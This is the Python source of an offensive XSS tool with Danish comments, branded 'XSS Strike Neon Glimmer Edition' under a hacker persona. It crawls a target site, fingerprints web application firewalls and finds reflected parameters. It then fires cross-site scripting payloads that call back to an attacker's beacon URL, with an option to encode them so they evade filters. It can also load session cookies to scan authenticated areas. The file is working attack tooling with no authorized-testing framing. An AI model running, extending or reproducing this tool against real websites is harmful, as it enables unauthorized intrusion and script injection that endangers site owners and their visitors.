#!/usr/bin/env python3
# xss_strike_v2.1.py — Auto-Crawler & XSS Scanner (Neon Glimmer Edition)
# Bygger oven på xss_forge. Tilføjer WAF-detektion, auto-encoder, HTML rapport,
# RGB farver, loading spinner og glimmer-bang på hits.
# Built by ☠ SYSTEM BREACHED ☠ — ◥꧁ SHΔDØW HΛCKΞR ꧂◤

import argparse, sys, time, random, string, re, urllib.parse
import http.cookiejar, urllib.request, urllib.error
import threading, queue, json, importlib.util, datetime, itertools
from html.parser import HTMLParser

# ───────────────────────────────────────────── ANSI Farver & Glimmer
C_R = '\033[0m'; C_B = '\033[1m'
C_RED = '\033[91m'; C_GRN = '\033[92m'; C_YEL = '\033[93m'
C_BLU = '\033[94m'; C_CYN = '\033[96m'; C_MAG = '\033[95m'
C_BG_MAG = '\033[45m'; C_BG_CYN = '\033[46m'
C_BLINK = '\033[5m'

# RGB 256 farve koder
def rgb(r, g, b): return f"\033[38;2;{r};{g};{b}m"
RAINBOW_COLORS = [
    rgb(255, 0, 0), rgb(255, 127, 0), rgb(255, 255, 0),
    rgb(0, 255, 0), rgb(0, 0, 255), rgb(75, 0, 130), rgb(148, 0, 211)
]

def rainbow(text):
    """Giver tekst en glidende regnbue-effekt."""
    return ''.join(f"{RAINBOW_COLORS[i % len(RAINBOW_COLORS)]}{c}{C_R}" for i, c in enumerate(text))

def glimmer_bang(text):
    """Flasher en boks med blink og farver."""
    border = f"{C_B}{C_RED}{'='*60}{C_R}"
    print(f"\n{border}")
    print(f"{C_B}{C_BG_CYN}{C_BLINK}  🚨 GLIMMER BANG - VULNERABILITY FOUND  🚨  {C_R}")
    print(f"{C_B}{C_GRN}{text}{C_R}")
    print(f"{C_B}{C_RED}{'='*60}{C_R}\n")

def log_info(m):  print(f"{C_B}{C_BLU}[*]{C_R} {m}")
def log_ok(m):    print(f"{C_B}{C_GRN}[+]{C_R} {m}")
def log_warn(m):  print(f"{C_B}{C_YEL}[!]{C_R} {m}")
def log_fail(m):  print(f"{C_B}{C_RED}[-]{C_R} {m}")
def log_hit(m):   glimmer_bang(m)

# ───────────────────────────────────────────── Spinner
class Spinner:
    def __init__(self, message="Arbejder"):
        self.message = message
        self.spinner = itertools.cycle(['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'])
        self.running = False
        self.thread = None

    def _spin(self):
        while self.running:
            sys.stdout.write(f"\r{C_CYN}{next(self.spinner)}{C_R} {self.message} ... ")
            sys.stdout.flush()
            time.sleep(0.1)
        sys.stdout.write(f"\r{' ' * (len(self.message) + 15)}\r")

    def start(self):
        self.running = True
        self.thread = threading.Thread(target=self._spin)
        self.thread.daemon = True
        self.thread.start()

    def stop(self):
        self.running = False
        if self.thread:
            self.thread.join()

# ───────────────────────────────────────────── load forge
def load_forge(path):
    spec = importlib.util.spec_from_file_location('forge', path)
    m = importlib.util.module_from_spec(spec); spec.loader.exec_module(m); return m

# ───────────────────────────────────────────── session
class Session:
    def __init__(self, cookies_file=None):
        self.jar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.jar),
            urllib.request.HTTPRedirectHandler())
        self.headers = {
            'User-Agent':'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 '
                         '(KHTML, like Gecko) Chrome/122.0 Mobile Safari/537.36',
            'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language':'en-US,en;q=0.9',
        }
        if cookies_file: self._load_cookies(cookies_file)
    def _load_cookies(self, path):
        for line in open(path):
            line = line.strip()
            if not line or line.startswith('#'): continue
            parts = line.split('\t')
            if len(parts) != 7: continue
            dom, _, pth, sec, exp, name, val = parts
            c = http.cookiejar.Cookie(
                version=0, name=name, value=val, port=None, port_specified=False,
                domain=dom, domain_specified=True, domain_initial_dot=dom.startswith('.'),
                path=pth, path_specified=True, secure=(sec=='TRUE'),
                expires=int(exp) or None, discard=(exp=='0'), comment=None,
                comment_url=None, rest={}, rfc2109=False)
            self.jar.set_cookie(c)
    def fetch(self, url, method='GET', data=None, extra_headers=None, timeout=15):
        h = dict(self.headers)
        if extra_headers: h.update(extra_headers)
        body = None
        if data is not None:
            body = urllib.parse.urlencode(data).encode() if isinstance(data, dict) else data
            h.setdefault('Content-Type','application/x-www-form-urlencoded')
        req = urllib.request.Request(url, data=body, headers=h, method=method)
        try:
            r = self.opener.open(req, timeout=timeout)
            raw = r.read()
            return r.getcode(), raw.decode('utf-8','replace'), dict(r.headers), r.geturl()
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode('utf-8','replace'), dict(e.headers), url
        except Exception as e:
            return 0, '', {'error':str(e)}, url

# ───────────────────────────────────────────── rate limiter
class RateLimiter:
    def __init__(self, rps):
        self.rps = max(1, rps)
        self.last = 0.0
        self.lock = threading.Lock()
    def wait(self):
        with self.lock:
            now = time.time(); gap = 1.0 / self.rps
            if now - self.last < gap: time.sleep(gap - (now - self.last))
            self.last = time.time()

# ───────────────────────────────────────────── parser
class LinkFormParser(HTMLParser):
    def __init__(self, base_url):
        super().__init__()
        self.base_url = base_url
        self.links = set()
        self.forms = []
        self.current_form = None

    def handle_starttag(self, tag, attrs):
        attrs_d = dict(attrs)
        if tag == 'a' and 'href' in attrs_d:
            link = urllib.parse.urljoin(self.base_url, attrs_d['href'])
            if not link.startswith('javascript:') and not link.startswith('mailto:') and '#' not in link:
                self.links.add(link)
        elif tag == 'form':
            action = urllib.parse.urljoin(self.base_url, attrs_d.get('action', self.base_url))
            method = attrs_d.get('method', 'GET').upper()
            self.current_form = {'action': action, 'method': method, 'inputs': {}}
        elif tag in ('input', 'textarea', 'select') and self.current_form is not None:
            name = attrs_d.get('name')
            if name:
                self.current_form['inputs'][name] = attrs_d.get('value', 'test')

    def handle_endtag(self, tag):
        if tag == 'form' and self.current_form is not None:
            if self.current_form['inputs']:
                self.forms.append(self.current_form)
            self.current_form = None

# ───────────────────────────────────────────── WAF Detector
def detect_waf(headers, body):
    h_str = str(headers).lower()
    b_str = body.lower()[:5000]
    wafs = {
        'Cloudflare': ['cf-ray', 'cloudflare', 'cf-cache-status'],
        'Sucuri': ['x-sucuri', 'sucuri'],
        'Akamai': ['akamai', 'reference #'],
        'Imperva/Incapsula': ['incapsula', 'visid_incap', 'x-iinfo'],
        'F5 BIG-IP': ['bigip', 'big-ip'],
        'ModSecurity': ['mod_security', 'not acceptable!'],
    }
    for name, sigs in wafs.items():
        for sig in sigs:
            if sig in h_str or sig in b_str: return name
    return None

# ───────────────────────────────────────────── scanner
class XSSStrike:
    def __init__(self, forge, args):
        self.f = forge
        self.a = args
        self.session = Session(cookies_file=args.cookies)
        self.cb = args.cb.rstrip('/')
        self.queue = queue.Queue()
        self.visited_urls = set()
        self.normalized_paths = set()
        self.vulnerable = []
        self.lock = threading.Lock()
        self.limiter = RateLimiter(args.rate)
        self.domain = urllib.parse.urlparse(args.url).netloc
        self.hits_count_start = self.hits_count()
        self.waf = None

    def hits_count(self):
        try: return open('hits.log','rb').read().count(b'\n')
        except FileNotFoundError: return 0

    def wait_hit(self, before, timeout=6):
        t0 = time.time()
        while time.time()-t0 < timeout:
            if self.hits_count() > before: return True
            time.sleep(0.3)
        return False

    def crawl(self):
        while True:
            try:
                url, depth = self.queue.get_nowait()
            except queue.Empty:
                break

            p = urllib.parse.urlparse(url)
            norm_path = f"{p.netloc}{p.path}"
            if norm_path in self.normalized_paths:
                if not p.query: continue
            else:
                self.normalized_paths.add(norm_path)

            if url in self.visited_urls: continue
            self.visited_urls.add(url)

            # Log med farve baseret på dybde
            depth_color = C_GRN if depth == 0 else C_YEL if depth == 1 else C_MAG
            print(f"{C_BLU}[*]{C_R} Crawler {depth_color}[{depth}]{C_R}: {C_CYN}{url[:90]}{C_R}")

            self.limiter.wait()
            code, body, headers, final_url = self.session.fetch(url)

            if code == 0: continue

            if not self.waf and depth == 0:
                self.waf = detect_waf(headers, body)
                if self.waf:
                    log_warn(f"WAF detekteret: {C_BG_MAG}{C_B}{self.waf}{C_R}. Skruer ned for hastigheden.")

            if code != 200: continue

            parser = LinkFormParser(final_url)
            parser.feed(body)

            if depth < self.a.depth:
                for link in parser.links:
                    p_link = urllib.parse.urlparse(link)
                    if p_link.netloc == self.domain and link not in self.visited_urls:
                        if f"{p_link.netloc}{p_link.path}" not in self.normalized_paths or p_link.query:
                            self.queue.put((link, depth + 1))

            self.test_url_params(final_url)
            if self.a.forms and parser.forms:
                self.test_forms(parser.forms)

            self.queue.task_done()

    def test_url_params(self, url):
        p = urllib.parse.urlparse(url)
        if not p.query: return
        params = urllib.parse.parse_qsl(p.query)
        for name, _ in params:
            self.fire(url, 'query', name)

    def test_forms(self, forms):
        for form in forms:
            for input_name in form['inputs']:
                self.fire(form['action'], 'form_' + form['method'].lower(), input_name, base_data=form['inputs'])

    def fire(self, url, kind, param_name, base_data=None):
        canary = 'c' + ''.join(random.choices(string.ascii_lowercase,k=8)) + 'c'
        method = 'POST' if 'post' in kind else 'GET'

        if kind == 'query':
            u = urllib.parse.urlparse(url)
            q = urllib.parse.parse_qsl(u.query)
            new_q = [(k, canary if k == param_name else v) for k, v in q]
            probe_url = urllib.parse.urlunparse((u.scheme, u.netloc, u.path, u.params, urllib.parse.urlencode(new_q), u.fragment))
            self.limiter.wait()
            code, body, hdrs, _ = self.session.fetch(probe_url)
        else:
            d = dict(base_data or {})
            d[param_name] = canary
            self.limiter.wait()
            code, body, hdrs, _ = self.session.fetch(url, method=method, data=d)

        if code == 0 or canary not in body: return

        from xss_forge_exploit import fingerprint
        ctx, around = fingerprint(body, canary)
        if ctx == 'no_reflection': return

        log_warn(f"Reflektion: {C_B}{C_CYN}{param_name}{C_R} (ctx={C_YEL}{ctx}{C_R})")

        pool = self.f.PAYLOADS.get(ctx, [])
        if not pool: return

        if self.a.evade:
            enc_pool = []
            for enc in ['html_hex', 'js_uni', 'url2']:
                if enc in self.f.ENCODERS:
                    for p in pool[:2]:
                        enc_pool.append(self.f.ENCODERS[enc](p.replace('{CB}', self.cb)))
            pool = enc_pool + pool

        for i, tmpl in enumerate(pool):
            payload = tmpl.replace('{CB}', self.cb)
            before = self.hits_count()

            # Kør en lille spinner mens vi venter på beacon
            spinner = Spinner(f"Fyrer payload {i+1}/{len(pool)} på '{param_name}'")
            spinner.start()

            if kind == 'query':
                u = urllib.parse.urlparse(url)
                q = urllib.parse.parse_qsl(u.query)
                new_q = [(k, payload if k == param_name else v) for k, v in q]
                final_url = urllib.parse.urlunparse((u.scheme, u.netloc, u.path, u.params, urllib.parse.urlencode(new_q), u.fragment))
                self.limiter.wait()
                self.session.fetch(final_url)
            else:
                d = dict(base_data or {})
                d[param_name] = payload
                self.limiter.wait()
                self.session.fetch(url, method=method, data=d)

            hit = self.wait_hit(before, timeout=self.a.timeout)
            spinner.stop()

            if hit:
                with self.lock:
                    log_hit(f"BEACON FANGET: '{param_name}' (ctx={ctx})\nURL: {url}")
                    self.vulnerable.append({
                        'url': url, 'method': method, 'param': param_name,
                        'context': ctx, 'payload': payload,
                        'waf': self.waf, 'time': datetime.datetime.now().isoformat()
                    })
                break

    def scan(self):
        self.queue.put((self.a.url, 0))
        threads = []
        for _ in range(self.a.threads):
            t = threading.Thread(target=self.crawl)
            t.daemon = True
            t.start()
            threads.append(t)

        self.queue.join()

    def report(self):
        print(f"\n{C_B}{C_BG_MAG}=== SCAN FÆRDIG ==={C_R}")
        print(f"Sider scannet: {C_B}{len(self.visited_urls)}{C_R}")

        num_vulns = len(self.vulnerable)
        color = C_GRN if num_vulns > 0 else C_RED
        print(f"XSS huller fundet: {C_B}{color}{num_vulns}{C_R}")

        if self.waf: print(f"WAF blokeret: {C_YEL}{self.waf}{C_R}")

        for v in self.vulnerable:
            log_hit(f"[{v['context']}] {v['method']} {v['url']} -> {v['param']}")

        if self.vulnerable:
            with open('xss_report.json', 'w') as f:
                json.dump(self.vulnerable, f, indent=2)

            html = f"<html><head><title>XSS Strike Report</title><style>body{{font-family:monospace;background:#111;color:#eee;padding:20px}}table{{width:100%;border-collapse:collapse}}td,th{{border:1px solid #333;padding:8px;text-align:left}}th{{background:#222}}pre{{margin:0;white-space:pre-wrap;word-wrap:break-word}}a{{color:#6cf}}</style></head><body>"
            html += f"<h1 style='color:#0f0'>XSS Strike Report</h1><p>Target: {self.a.url}</p><p>Fundet: {len(self.vulnerable)}</p>"
            html += "<table><tr><th>Type</th><th>URL</th><th>Param</th><th>Payload</th></tr>"
            for v in self.vulnerable:
                html += f"<tr><td>{v['context']}</td><td><a href='{v['url']}'>{v['url']}</a></td><td>{v['param']}</td><td><pre>{v['payload'].replace('<','&lt;')}</pre></td></tr>"
            html += "</table></body></html>"
            with open('xss_report.html', 'w') as f:
                f.write(html)

            log_info("Rapport gemt i xss_report.json og xss_report.html.")

def main():
    banner = """
    ██╗  ██╗███████╗███████╗    ███████╗████████╗██████╗ ██╗██╗  ██╗███████╗
    ╚██╗██╔╝██╔════╝██╔════╝    ██╔════╝╚══██╔══╝██╔══██╗██║██║ ██╔╝██╔════╝
     ╚███╔╝ ███████╗███████╗    ███████╗   ██║   ██████╔╝██║█████╔╝ █████╗
     ██╔██╗ ╚════██║╚════██║    ╚════██║   ██║   ██╔══██╗██║██╔═██╗ ██╔══╝
    ██╔╝ ██╗███████║███████║    ███████║   ██║   ██║  ██║██║██║  ██╗███████╗
    ╚═╝  ╚═╝╚══════╝╚══════╝    ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝
    """
    print(rainbow(banner))
    print(f"{C_CYN}           Auto-Crawler & XSS Scanner (Neon Glimmer Edition){C_R}")
    print(f"{C_MAG}        Built by ☠ SYSTEM BREACHED ☠ — ◥꧁ SHΔDØW HΛCKΞR ꧂◤{C_R}\n")

    ap = argparse.ArgumentParser(prog='xss_strike_v2.1')
    ap.add_argument('-u', '--url', required=True, help="Start URL")
    ap.add_argument('-c', '--cb', required=True, help="Beacon callback URL")
    ap.add_argument('-d', '--depth', type=int, default=2, help="Crawl dybde")
    ap.add_argument('-t', '--threads', type=int, default=3, help="Antal workers")
    ap.add_argument('--rate', type=int, default=4, help="Max requests/sekund")
    ap.add_argument('--timeout', type=int, default=8, help="Sekunder at vente på beacon")
    ap.add_argument('--forms', action='store_true', help="Scan formularer")
    ap.add_argument('--evade', action='store_true', help="Brug encoders hvis standard fejler")
    ap.add_argument('--cookies', help="Netscape cookie fil")
    ap.add_argument('--forge-file', default='xss_forge.py', help="Sti til xss_forge.py")
    a = ap.parse_args()

    try: forge = load_forge(a.forge_file)
    except Exception as e:
        log_fail(f"Kunne ikke indlæse xss_forge.py: {e}"); sys.exit(1)

    strike = XSSStrike(forge, a)
    try:
        strike.scan()
        strike.report()
    except KeyboardInterrupt:
        print("\n")
        strike.report()
        sys.exit(0)

if __name__ == '__main__':
    main()
